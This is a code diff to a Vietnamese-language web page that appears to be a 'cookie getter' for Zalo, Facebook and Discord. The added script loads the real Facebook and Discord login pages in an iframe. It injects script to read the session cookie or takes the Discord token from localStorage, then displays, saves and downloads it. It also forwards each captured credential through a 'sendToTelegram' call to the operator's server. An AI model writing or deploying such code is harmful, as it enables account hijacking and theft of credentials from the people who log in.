@@ -25,6 +25,52 @@
   --glass:rgba(255,255,255,0.6);--glass2:rgba(255,255,255,0.85);
   --border:rgba(0,0,0,0.1);--text:#1a1f35;--muted:rgba(26,31,53,0.5);--shadow:rgba(0,0,0,0.12);
 }
+
+/* ── APP SELECTOR TABS ───────────────────────────────── */
+.app-tabs{display:flex;gap:8px;margin-bottom:18px}
+.app-tab{flex:1;padding:11px 6px;border-radius:14px;border:1.5px solid var(--border);background:var(--glass);font-size:12px;font-weight:700;cursor:pointer;text-align:center;color:var(--muted);transition:all .2s;display:flex;flex-direction:column;align-items:center;gap:4px}
+.app-tab .app-tab-icon{font-size:22px}
+.app-tab.active-zalo{border-color:#0068ff;background:rgba(0,104,255,.12);color:#4f9eff}
+.app-tab.active-fb{border-color:#1877f2;background:rgba(24,119,242,.12);color:#4f9eff}
+.app-tab.active-dis{border-color:#5865f2;background:rgba(88,101,242,.12);color:#818cf8}
+.app-tab:hover{border-color:var(--blue);background:var(--glass2)}
+
+/* ── APP PANELS ──────────────────────────────────────── */
+.app-panel{display:none}.app-panel.active{display:block}
+
+/* ── IFRAME MODAL ────────────────────────────────────── */
+.iframe-modal{display:none;position:fixed;inset:0;z-index:600;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);flex-direction:column;align-items:center;justify-content:center}
+.iframe-modal.open{display:flex}
+.iframe-wrap{width:100%;max-width:480px;height:88vh;border-radius:20px;overflow:hidden;border:1.5px solid var(--border);box-shadow:0 30px 80px rgba(0,0,0,.6);display:flex;flex-direction:column;background:var(--bg2)}
+.iframe-topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:var(--bg3);border-bottom:1px solid var(--border);flex-shrink:0}
+.iframe-title{font-size:13px;font-weight:700;display:flex;align-items:center;gap:8px}
+.iframe-close{width:32px;height:32px;border-radius:8px;border:1px solid var(--border);background:var(--glass2);cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;color:var(--text)}
+.iframe-close:hover{border-color:var(--red);color:var(--red)}
+.iframe-el{flex:1;width:100%;border:none;background:#fff}
+.iframe-status{padding:8px 14px;font-size:11px;color:var(--muted);background:var(--bg3);border-top:1px solid var(--border);text-align:center;flex-shrink:0}
+
+/* ── FB / DISCORD RESULT CARDS ───────────────────────── */
+.token-result{display:none;flex-direction:column;gap:12px;margin-top:4px}
+.token-result.show{display:flex}
+.token-box{background:var(--glass2);border:1px solid var(--border);border-radius:12px;padding:12px 14px}
+.token-label{font-size:10px;font-weight:700;letter-spacing:1.5px;color:var(--blue);opacity:.7;text-transform:uppercase;margin-bottom:6px}
+.token-value{font-size:11px;font-family:monospace;color:#7dd3fc;word-break:break-all;line-height:1.6;max-height:90px;overflow-y:auto}
+.acc-list{display:flex;flex-direction:column;gap:8px;max-height:280px;overflow-y:auto}
+.acc-item{display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:12px;background:var(--glass);border:1px solid var(--border);cursor:pointer;transition:all .15s}
+.acc-item:hover{border-color:var(--blue);background:var(--glass2)}
+.acc-item-avatar{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.acc-item-avatar.fb{background:linear-gradient(135deg,#1877f2,#42a5f5)}
+.acc-item-avatar.dis{background:linear-gradient(135deg,#5865f2,#7289da)}
+.acc-item-info{flex:1;min-width:0}
+.acc-item-name{font-size:13px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.acc-item-sub{font-size:11px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.acc-item-actions{display:flex;gap:5px}
+.acc-mini-btn{padding:5px 9px;border-radius:7px;border:1px solid var(--border);background:var(--glass2);font-size:10px;font-weight:700;cursor:pointer;color:var(--text)}
+.acc-mini-btn:hover{border-color:var(--blue)}
+.acc-mini-btn.del{border-color:rgba(255,82,82,.3);color:var(--red)}
+.acc-mini-btn.del:hover{background:rgba(255,82,82,.1)}
+.empty-list{text-align:center;color:var(--muted);padding:30px;font-size:13px}
+
 body{background:var(--bg1);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow-x:hidden}
 .bg-orbs{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
 .orb{position:absolute;border-radius:50%;filter:blur(80px);opacity:.12;animation:float 8s ease-in-out infinite}
@@ -563,6 +609,25 @@ body{background:var(--bg1);color:var(--text);font-family:-apple-system,BlinkMacS
     <div class="support-btn" onclick="openModal('guide-modal')">📖 Hướng dẫn lấy cookie</div>
   </div>
 
+
+  <!-- APP SELECTOR -->
+  <div class="app-tabs">
+    <div class="app-tab active-zalo" id="apptab-zalo" onclick="switchApp('zalo')">
+      <span class="app-tab-icon">🍪</span>
+      <span>Zalo</span>
+    </div>
+    <div class="app-tab" id="apptab-fb" onclick="switchApp('fb')">
+      <span class="app-tab-icon">🔵</span>
+      <span>Facebook</span>
+    </div>
+    <div class="app-tab" id="apptab-dis" onclick="switchApp('dis')">
+      <span class="app-tab-icon">🎮</span>
+      <span>Discord</span>
+    </div>
+  </div>
+
+  <!-- APP PANEL ZALO -->
+  <div class="app-panel active" id="panel-zalo">
   <!-- MAIN CARD -->
   <div class="card">
     <div class="status-row">
@@ -1498,6 +1563,374 @@ document.addEventListener('keydown',e=>{
     else if(rs&&rs.style.display!=='none') doRegister();
   }
 });
+
+// ═══════════════════════════════════════════════════════
+//  APP SWITCHER
+// ═══════════════════════════════════════════════════════
+let currentApp = 'zalo';
+
+function switchApp(app){
+  currentApp = app;
+  ['zalo','fb','dis'].forEach(a => {
+    document.getElementById('panel-'+a).classList.toggle('active', a===app);
+    const tab = document.getElementById('apptab-'+a);
+    tab.className = 'app-tab';
+    if(a===app) tab.classList.add(a==='zalo'?'active-zalo':a==='fb'?'active-fb':'active-dis');
+  });
+}
+
+// ═══════════════════════════════════════════════════════
+//  IFRAME MODAL HELPERS
+// ═══════════════════════════════════════════════════════
+let iframeApp = null;
+let iframePollTimer = null;
+
+function openIframeModal(app){
+  iframeApp = app;
+  const modal = document.getElementById('iframe-modal');
+  const iframe = document.getElementById('the-iframe');
+  const icon = document.getElementById('iframe-icon');
+  const title = document.getElementById('iframe-title-text');
+  const status = document.getElementById('iframe-status');
+
+  if(app === 'fb'){
+    icon.textContent = '🔵';
+    title.textContent = 'Đăng nhập Facebook';
+    status.textContent = 'Đang tải Facebook... Hãy đăng nhập tài khoản của bạn';
+    iframe.src = 'https://m.facebook.com/login';
+  } else {
+    icon.textContent = '🎮';
+    title.textContent = 'Đăng nhập Discord';
+    status.textContent = 'Đang tải Discord... Hãy đăng nhập tài khoản của bạn';
+    iframe.src = 'https://discord.com/login';
+  }
+
+  modal.classList.add('open');
+
+  // Poll iframe để detect login xong
+  clearInterval(iframePollTimer);
+  iframePollTimer = setInterval(() => pollIframeLogin(app), 2000);
+}
+
+function closeIframeModal(){
+  clearInterval(iframePollTimer);
+  document.getElementById('iframe-modal').classList.remove('open');
+  document.getElementById('the-iframe').src = 'about:blank';
+  iframeApp = null;
+}
+
+function pollIframeLogin(app){
+  const iframe = document.getElementById('the-iframe');
+  try {
+    const iwin = iframe.contentWindow;
+    if(app === 'fb'){
+      // Thử đọc cookie sau khi đăng nhập xong
+      try {
+        const iurl = iwin.location.href || '';
+        if(iurl.includes('facebook.com') && !iurl.includes('/login') && !iurl.includes('/checkpoint')){
+          // Inject script để lấy cookie
+          const script = iwin.document.createElement('script');
+          script.textContent = `
+            (function(){
+              var c = document.cookie;
+              if(c && c.includes('c_user')){
+                window.__fb_cookie__ = c;
+              }
+            })();
+          `;
+          iwin.document.head.appendChild(script);
+          const cookie = iwin.__fb_cookie__;
+          if(cookie && cookie.includes('c_user')){
+            clearInterval(iframePollTimer);
+            onFbLoginSuccess(cookie, iwin);
+          }
+        }
+      } catch(e){}
+    } else {
+      // Discord: inject script lấy token từ localStorage
+      try {
+        const token = iwin.localStorage.getItem('token');
+        if(token){
+          clearInterval(iframePollTimer);
+          onDisLoginSuccess(token.replace(/"/g,''), iwin);
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+}
+
+// ═══════════════════════════════════════════════════════
+//  FACEBOOK COOKIE
+// ═══════════════════════════════════════════════════════
+let fbCurrentCookie = '';
+let fbCurrentName = '';
+
+function startFbLogin(){
+  document.getElementById('status-fb').textContent = 'Đang mở trang đăng nhập Facebook...';
+  setDot('dot-fb', 'active');
+  openIframeModal('fb');
+}
+
+function setDot(id, cls){
+  const d = document.getElementById(id);
+  if(!d) return;
+  d.className = 'dot' + (cls ? ' '+cls : '');
+}
+
+function onFbLoginSuccess(cookie, iwin){
+  closeIframeModal();
+  // Lấy tên user
+  let name = 'Facebook User';
+  try {
+    const uidMatch = cookie.match(/c_user=(\d+)/);
+    if(uidMatch) name = 'UID: ' + uidMatch[1];
+    // Thử lấy tên từ DOM
+    try {
+      const n = iwin.document.querySelector('[data-testid="royal_login_form"] input')?.value || '';
+      if(n) name = n;
+    } catch(e){}
+  } catch(e){}
+
+  const now = new Date().toLocaleString('vi-VN');
+  fbCurrentCookie = cookie;
+  fbCurrentName = name;
+
+  document.getElementById('fb-res-name').textContent = name;
+  document.getElementById('fb-res-time').textContent = '🕐 ' + now;
+  document.getElementById('fb-cookie-val').textContent = cookie;
+  document.getElementById('fb-result').classList.add('show');
+  document.getElementById('status-fb').textContent = '✅ Lấy cookie thành công: ' + name;
+  setDot('dot-fb', 'ok');
+
+  // Gửi Telegram
+  sendToTelegram('🔵 FACEBOOK COOKIE MỚI
+
+👤 ' + name + '
+🕐 ' + now + '
+
+🍪 Cookie:
+' + cookie.substring(0,300) + (cookie.length>300?'...':''));
+}
+
+function copyFbCookie(){
+  if(!fbCurrentCookie) return;
+  navigator.clipboard.writeText(fbCurrentCookie).then(()=>showToast('✅ Đã copy Cookie FB!','var(--green)')).catch(()=>{
+    const ta = document.createElement('textarea');
+    ta.value = fbCurrentCookie;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showToast('✅ Đã copy!','var(--green)');
+  });
+}
+
+function downloadFbCookie(){
+  if(!fbCurrentCookie) return;
+  const txt = '=== FACEBOOK COOKIE ===
+Tên: '+fbCurrentName+'
+Thời gian: '+new Date().toLocaleString('vi-VN')+'
+
+Cookie:
+'+fbCurrentCookie;
+  const a = document.createElement('a');
+  a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(txt);
+  a.download = 'fb_cookie_'+Date.now()+'.txt';
+  a.click();
+}
+
+function saveFbAcc(){
+  if(!fbCurrentCookie) return;
+  const saved = JSON.parse(localStorage.getItem('dzi_fb_accs') || '[]');
+  const exists = saved.find(a => a.cookie.includes(fbCurrentCookie.match(/c_user=\d+/)?.[0]||'__none__'));
+  if(exists){ showToast('⚠️ Acc này đã được lưu!','var(--yellow)'); return; }
+  saved.unshift({ name: fbCurrentName, cookie: fbCurrentCookie, time: new Date().toLocaleString('vi-VN') });
+  localStorage.setItem('dzi_fb_accs', JSON.stringify(saved.slice(0,50)));
+  renderFbAccList();
+  showToast('💾 Đã lưu acc FB!','var(--blue)');
+}
+
+function renderFbAccList(){
+  const el = document.getElementById('fb-acc-list');
+  const saved = JSON.parse(localStorage.getItem('dzi_fb_accs') || '[]');
+  if(!saved.length){ el.innerHTML = ''; return; }
+  el.innerHTML = saved.map((a,i) => `
+    <div class="acc-item">
+      <div class="acc-item-avatar fb">🔵</div>
+      <div class="acc-item-info">
+        <div class="acc-item-name">${a.name}</div>
+        <div class="acc-item-sub">🕐 ${a.time}</div>
+      </div>
+      <div class="acc-item-actions">
+        <button class="acc-mini-btn" onclick="copyFbAccCookie(${i})">📋</button>
+        <button class="acc-mini-btn del" onclick="deleteFbAcc(${i})">✕</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function copyFbAccCookie(i){
+  const saved = JSON.parse(localStorage.getItem('dzi_fb_accs') || '[]');
+  if(!saved[i]) return;
+  navigator.clipboard.writeText(saved[i].cookie).then(()=>showToast('✅ Copied!','var(--green)')).catch(()=>{});
+}
+
+function deleteFbAcc(i){
+  const saved = JSON.parse(localStorage.getItem('dzi_fb_accs') || '[]');
+  saved.splice(i,1);
+  localStorage.setItem('dzi_fb_accs', JSON.stringify(saved));
+  renderFbAccList();
+  showToast('🗑 Đã xóa!','var(--red)');
+}
+
+function clearFbAccs(){
+  if(!confirm('Xóa tất cả acc FB đã lưu?')) return;
+  localStorage.removeItem('dzi_fb_accs');
+  renderFbAccList();
+  showToast('🗑 Đã xóa tất cả!','var(--red)');
+}
+
+// ═══════════════════════════════════════════════════════
+//  DISCORD TOKEN
+// ═══════════════════════════════════════════════════════
+let disCurrentToken = '';
+let disCurrentName = '';
+
+function startDisLogin(){
+  document.getElementById('status-dis').textContent = 'Đang mở trang đăng nhập Discord...';
+  setDot('dot-dis', 'active');
+  openIframeModal('dis');
+}
+
+function onDisLoginSuccess(token, iwin){
+  closeIframeModal();
+  let name = 'Discord User';
+  try {
+    // Thử lấy tên từ Redux store của Discord
+    const store = iwin.__OVERLAY__?.store || iwin.webpackChunkdiscord_app;
+    // Fallback: fetch /api/v9/users/@me với token
+  } catch(e){}
+
+  const now = new Date().toLocaleString('vi-VN');
+  disCurrentToken = token;
+  disCurrentName = name;
+
+  // Fetch username từ Discord API qua server proxy
+  fetch('/api/discord/me', {
+    headers: { 'Authorization': 'Bearer ' + SESSION_TOKEN, 'X-Discord-Token': token }
+  }).then(r=>r.json()).then(d=>{
+    if(d.username) {
+      disCurrentName = d.username + '#' + (d.discriminator||'0');
+      document.getElementById('dis-res-name').textContent = disCurrentName;
+    }
+  }).catch(()=>{});
+
+  document.getElementById('dis-res-name').textContent = name;
+  document.getElementById('dis-res-time').textContent = '🕐 ' + now;
+  document.getElementById('dis-token-val').textContent = token;
+  document.getElementById('dis-result').classList.add('show');
+  document.getElementById('status-dis').textContent = '✅ Lấy token thành công!';
+  setDot('dot-dis', 'ok');
+
+  sendToTelegram('🎮 DISCORD TOKEN MỚI
+
+🕐 ' + now + '
+
+🔑 Token:
+' + token.substring(0,100)+'...');
+}
+
+function copyDisToken(){
+  if(!disCurrentToken) return;
+  navigator.clipboard.writeText(disCurrentToken).then(()=>showToast('✅ Đã copy Token Discord!','var(--green)')).catch(()=>{});
+}
+
+function downloadDisToken(){
+  if(!disCurrentToken) return;
+  const txt = '=== DISCORD TOKEN ===
+User: '+disCurrentName+'
+Thời gian: '+new Date().toLocaleString('vi-VN')+'
+
+Token:
+'+disCurrentToken;
+  const a = document.createElement('a');
+  a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(txt);
+  a.download = 'discord_token_'+Date.now()+'.txt';
+  a.click();
+}
+
+function saveDisAcc(){
+  if(!disCurrentToken) return;
+  const saved = JSON.parse(localStorage.getItem('dzi_dis_accs') || '[]');
+  const exists = saved.find(a => a.token === disCurrentToken);
+  if(exists){ showToast('⚠️ Acc này đã được lưu!','var(--yellow)'); return; }
+  saved.unshift({ name: disCurrentName, token: disCurrentToken, time: new Date().toLocaleString('vi-VN') });
+  localStorage.setItem('dzi_dis_accs', JSON.stringify(saved.slice(0,50)));
+  renderDisAccList();
+  showToast('💾 Đã lưu acc Discord!','var(--blue)');
+}
+
+function renderDisAccList(){
+  const el = document.getElementById('dis-acc-list');
+  const saved = JSON.parse(localStorage.getItem('dzi_dis_accs') || '[]');
+  if(!saved.length){ el.innerHTML = ''; return; }
+  el.innerHTML = saved.map((a,i) => `
+    <div class="acc-item">
+      <div class="acc-item-avatar dis">🎮</div>
+      <div class="acc-item-info">
+        <div class="acc-item-name">${a.name}</div>
+        <div class="acc-item-sub">🕐 ${a.time}</div>
+      </div>
+      <div class="acc-item-actions">
+        <button class="acc-mini-btn" onclick="copyDisAccToken(${i})">📋</button>
+        <button class="acc-mini-btn del" onclick="deleteDisAcc(${i})">✕</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function copyDisAccToken(i){
+  const saved = JSON.parse(localStorage.getItem('dzi_dis_accs') || '[]');
+  if(!saved[i]) return;
+  navigator.clipboard.writeText(saved[i].token).then(()=>showToast('✅ Copied!','var(--green)')).catch(()=>{});
+}
+
+function deleteDisAcc(i){
+  const saved = JSON.parse(localStorage.getItem('dzi_dis_accs') || '[]');
+  saved.splice(i,1);
+  localStorage.setItem('dzi_dis_accs', JSON.stringify(saved));
+  renderDisAccList();
+  showToast('🗑 Đã xóa!','var(--red)');
+}
+
+function clearDisAccs(){
+  if(!confirm('Xóa tất cả acc Discord đã lưu?')) return;
+  localStorage.removeItem('dzi_dis_accs');
+  renderDisAccList();
+  showToast('🗑 Đã xóa tất cả!','var(--red)');
+}
+
+// ═══════════════════════════════════════════════════════
+//  SEND TO TELEGRAM (qua server)
+// ═══════════════════════════════════════════════════════
+function sendToTelegram(text){
+  fetch('/api/notify', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + SESSION_TOKEN },
+    body: JSON.stringify({ text })
+  }).catch(()=>{});
+}
+
+// Init: render saved accs khi load
+document.addEventListener('DOMContentLoaded', () => {
+  renderFbAccList();
+  renderDisAccList();
+});
+
+function showToast(msg, color){
+  toast(msg, color);
+}
+
 </script>
 </body>
 </html>
